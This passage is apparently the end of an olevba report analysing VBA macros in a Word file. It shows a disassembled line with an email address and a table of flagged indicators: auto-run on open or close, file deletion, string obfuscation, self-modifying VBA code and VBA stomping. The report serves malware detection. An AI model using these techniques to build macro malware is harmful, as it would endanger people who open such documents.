' 	QuoteRem 0x0000 0x0015 " phie_fe@lovemail.com"
' Line #280:
' Line #281:
' Line #282:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

